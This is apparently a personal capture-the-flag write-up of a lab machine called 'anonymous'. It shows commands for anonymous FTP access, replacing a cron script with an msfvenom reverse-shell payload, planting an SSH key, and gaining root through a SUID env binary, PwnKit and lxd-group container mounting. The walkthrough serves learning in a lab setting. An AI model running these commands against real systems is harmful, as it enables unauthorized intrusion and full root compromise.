There's a few openings here.
We have a ftp-server that might be open to anonymous login, and we have smb-shares
that we can enumerate. Let's start with the ftp server.

$ ftp anonymous@10.10.165.195

Inside scripts/ we find 3 files:
cat clean.sh
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi

$ cat removed_files.log

$ cat to_do.txt
I really need to disable the anonymous login...it's really not safe

It's possible that clean.sh runs as a cronjob, and since we have ftp-access
we could replace it with a bash reverse-shell. 

We can generate one using msfvenom:
$ msfvenom -p cmd/unix/reverse_bash LHOST=our_ip LPORT=4444 -f raw -o clean.sh

Let's start a listener:
$ nc -lvnp 4444

And place the reverse shell on the server:
ftp> put clean.sh
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||5783|)
150 Ok to send data.
100% |*****************************************************************************************************************|    70        1.75 MiB/s    00:00 ETA
226 Transfer complete.
70 bytes sent in 00:00 (0.83 KiB/s)

And we got a connection more or less instantly:
$ id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)

The server have python3 installed, so lets stabilize the shell as per the instructions
in shells-cheat-sheet.

Let's see if we can get a more permanent shell, rather than a reverse shell.
Let's see if we can login via ssh.
We have am ssh-server running:
namelessone@anonymous:~$ ps aux|grep ssh
root       934  0.0  0.5  72300  5572 ?        Ss   18:18   0:00 /usr/sbin/sshd -D

However, we do not have a ~/.ssh:
namelessone@anonymous:~$ ls .ssh
ls: cannot access '.ssh': No such file or directory

so let's create one and place public ssh-key in it.
And now we can log in via ssh, and find the key in user.txt
$ cat user.txt
90d6f992585815ff991e68748c414740
********************************

And we can scan the SMB-shares by using smbmap (on the attack machine) just to
see what we can find:
$ smbmap -H 10.10.165.195
[+] Guest session       IP: 10.10.165.195:445   Name: 10.10.165.195

        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        pics                                                    READ ONLY       My SMB Share Directory for Pics
        IPC$                                                    NO ACCESS       IPC Service (anonymous server (Samba, Ubuntu))

Now lets try to get root. Let's poke around a bit before we run linpeas or enum4linux.

From linpeas we can tell that it is possibly vulnerable to a few CVEs, including
Pwnkit (CVE-2021-4034) which I was able to use to get root access.

Although that is a bit boring solution. I played around a bit with SMB, but couldn't 
quite find anything useful, but it's an area that I need to improve on. I'll read
through the walkthroughs to see if I can find more interesting ways of gaining root
on this machine.

If we look through /usr/bin for suid binaries:
find /usr/bin/ -perm /u=s,g=s -exec ls -lh {} \; 2>/dev/null

and cross reference them to binaries in the suid category on gtfobins, we find
that we can use /usr/bin/env fir privilege escalation if the suid bit is set.
And we are in luck:
-rwsr-xr-x 1 root root 35K Jan 18  2018 /usr/bin/env

And by running "env /bin/sh -p"  we are able to get a root shell
$ env /bin/sh -p
# id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)

The -p option to /bin/sh makes it so sh doesn't reset the effective uid.

According to one of the walkthroughs, the fact that namelessone is a member of
the lxd group:
$ groups
namelessone adm cdrom sudo dip plugdev lxd

is also supposed to be an avenue for privesc. Lets see if we can use that.

On https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation
we can find some good info. It essentially amounts to creating a lxc image that
can read from the root fs on the host.

After building the alpine image on the attackbox and transfering it to the victim:
namelessone@anonymous:~/alpine: lxd init
namelessone@anonymous:~/alpine$ lxc image import ./alpine-v3.*.tar.gz --alias myimage
namelessone@anonymous:~/alpine$ lxc init myimage mycontainer -c security.privileged=true
namelessone@anonymous:~/alpine$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
namelessone@anonymous:~/alpine$ lxc start privesc
namelessone@anonymous:~/alpine$ lxc init myimage mycontainer -c security.privileged=true
namelessone@anonymous:~/alpine$ lxc start mycontainer
namelessone@anonymous:~/alpine$ lxc exec mycontainer /bin/sh
~ # cat /mnt/root/root/root.txt
********************************

I'm stil curious about the SMB-share, if it was a possible attack vector, or just
to throw people off.

All in all, quite a fun room. It was fun with multiple privesc opportunities,
especially the lxd one.
